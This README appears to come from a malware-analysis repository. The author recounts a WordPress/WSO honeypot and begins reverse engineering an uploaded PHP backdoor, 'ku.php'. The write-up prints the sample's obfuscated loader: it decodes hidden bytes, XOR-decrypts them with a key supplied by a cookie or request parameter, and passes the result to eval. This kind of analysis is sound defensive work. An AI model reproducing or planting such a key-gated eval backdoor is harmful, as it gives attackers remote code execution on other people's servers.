# xor-decoding
## Decoding Exclusive-or encoded malware payloads

During the summoer of 2014, I [wrote and ran](http://stratigery.com/phparasites/)
a honey pot that emulated a poorly maintained WordPress 2.9 installation. I ended up
including a simulated ["WSO" web shell}(https://github.com/bediger4000/malware-phylogeny)
as part of the honey pot, because attackers included WSO web shells in so many of
their fake WordPress plugins. I had a two phase honey pot: first phase simulated
WordPress, the second phase simulated WSO.

Attackers use WSO as a file uploader as much as they use it for anything else. I find
this puzzling, as WSO includes so much more functionality, but I'm not a bottom feeding
WordPress cracker. Attackers uploaded many pieces of malware using the honey pot's
simulated WSO web shell. One of these uploads occurred Wed Aug 28 04:05:52 2013 MDT.
The simulated WSO web shell kept a log of its environment, PHP "superglobal" values,
HTTP cookie values and many other things. The simulated web shell also allows file
uploads by emulating WSO's `uploadFile` command, part of the `FilesMan` "action".

The attacker, from 95.211.231.143 at the time, uploaded a file named "ku.php".

I've included the simulated WSO web shell's logged data as file
[95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAH.mod_system.scans](https://github.com/bediger4000/xor-decoding/blob/master/95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAH.mod_system.scans)
in this repo, and the uploaded file as [95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAHfile](https://github.com/bediger4000/xor-decoding/blob/master/95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAHfile).

My goal is to document how to de-obfuscate and reverse engineer the "ku.php" file,
which ultimately involved finding XOR-encoding key strings.

## Initial Reading of ku.php

My initial read of `ku.php` showed me that, when executed, it tried to download
the contents of `http://smtp.botabota.biz/ku/ku.txt` to a local file, and return
the URL where someone could access the local file from the Internet. The last line
of `ku.php` didn't fit with the rest of the code. The last line was 12,941 characters
long, and contained some ugly code. After pretty printing, that 12,941 character
line looked like this:

    <?php
    for (
          $o = 0, $e = 'string of random-appearing characters',$d = '';
          @ord($e[$o]);
          $o++)
    ) {
        if ($o < 16) {
            $h[$e[$o]] = $o;
        } else {
            $d .= @chr(($h[$e[$o]] << 4) + $h[$e[++$o]]);
        }
    }
    if (!@isset($_SERVER)) {
        $_COOKIE =& $HTTP_COOKIE_VARS;
        $_POST =& $HTTP_POST_VARS;
        $_GET =& $HTTP_GET_VARS;
    }
    $k = $_COOKIE['key'];
    if (empty($k)) {
        $k = $_POST['key'];
    }
    if (empty($k)) {
        $k = $_GET['key'];
    }
    if (!@function_exists('decrypt')) {
        eval('function decrypt($e,$k){if(!$k){return;}$el=@strlen($e);$kl=@strlen($k);$rl=$el%$kl;$fl=$el-$rl;for($o=0;$o<$fl;$o+=$kl){$p=@substr($e,$o,$kl);$d.="$k"^"$p";}if($rl){$p=@substr($e,$fl,$rl);$k=@substr($k,0,$rl);$d.="$k"^"$p";}return($d);}');
    }
    $d = @decrypt($d, $k);
    eval($d);

`ku.php` seemed to have been backdoored: some oddly encoded bytes get decoded,
then decrypted, and then evaluated. The decryption function was included in `ku.php`, and
the decryption key would arrive as part of the HTTP request for `ku.php`.

Pretty-printing `function decrypt()` from the string in `ku.php` showed me that whatever
code was concealed was actually XOR-encoded. A key in the form of a printable text string
would be bitwise exclusively or-ed with the decoded bytes.

    function decrypt($e, $k)
    {
        if (!$k) {
            return;
        }
        $el = @strlen($e);
        $kl = @strlen($k);
        $rl = $el % $kl;
        $fl = $el - $rl;
        for ($o = 0; $o < $fl; $o += $kl) {
            $p = @substr($e, $o, $kl);
            $d .= "{$k}" ^ "{$p}";
        }
        if ($rl) {
            $p = @substr($e, $fl, $rl);
            $k = @substr($k, 0, $rl);
            $d .= "{$k}" ^ "{$p}";
        }
        return $d;
    }

## Getting the xor-encoded payload

## Finding key size

[Hamming Distance](https://en.wikipedia.org/wiki/Hamming_distance)

    $ make keysize
    $ ./keysize ciphertextfilename > dat
